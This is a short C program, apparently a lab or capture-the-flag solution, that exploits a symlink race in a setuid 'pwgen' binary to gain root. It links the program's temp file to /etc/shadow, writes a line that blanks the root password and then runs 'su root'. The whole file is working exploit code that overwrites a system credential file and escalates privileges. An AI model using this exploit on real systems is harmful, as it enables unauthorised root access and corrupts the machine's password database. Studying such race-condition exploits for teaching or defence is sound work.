#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char * argv[]) {
        /*Create a pointer to a dummy file and the pwgen file*/
        FILE * filepointer;

        /*Create char array containing the shell commands to be executed*/
        char fileName[] = "/tmp/dummyFile";
        char defaultFile[] = "/tmp/pwgen_random";
        char command[] = "/usr/local/bin/pwgen -e";
        char shadowFileOne[] = "/etc/shadow";
        char destoryTemp[] = "rm /tmp/pwgen_random";

        /*Create a dummy file in the temp directory*/
        fclose(fopen(fileName, "w"));

        /*Link the dummy file to the default filename used in pwgen*/
        symlink(fileName, defaultFile);

        /*Open the pwgen application in another thread*/
        filepointer = popen(command, "w");

        /*Delete the temporary file*/
        system(destoryTemp);

        /*Link the temp file to the shadow file*/
        symlink(shadowFileOne, defaultFile);

        /*Overwrite the password located in the shadow file for the root user*/
        fprintf(filepointer, "\nroot::99999::::::");
        fclose(filepointer);

        /*Enter as the root user*/
        system("su root");
        exit(0);
}